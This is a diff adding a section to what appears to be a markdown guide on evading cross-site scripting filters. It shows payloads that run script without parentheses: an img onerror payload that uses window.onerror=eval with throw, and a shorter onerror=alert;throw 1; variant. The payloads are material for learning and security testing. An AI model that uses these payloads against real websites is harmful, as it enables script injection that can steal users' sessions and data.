@@ -46,4 +46,17 @@ decodeURIComponent(/alert(%22xss%22)/.source)
 
 These methods could be useful if you can inject into a script or event handler, but you cannot use quotation marks because they are properly escaped.
 ## Escaping Parentheses
-Parentheses are fundamental to invoke a function and pass parameters. Due to this, some filters removes all parentheses.
+Parentheses are fundamental to invoke a function and pass parameters. Due to this, some filters removes all parentheses. To bypass this, Gareth Heyes [found a way](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/) to pass arguments without using parentheses:
+```javascript
+<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
+
+// eval - function to invoke in case of error
+// throw - generate the error
+// alert... - parameters For the error function
+```
+A much simpler version would be:
+```js
+onerror=alert;throw 1;
+```
+
+The technique above abuses the `onerror` handler, assigning a function to call once an error has been generated using `throw` followed by the arguments to the function assigned to the error handler.
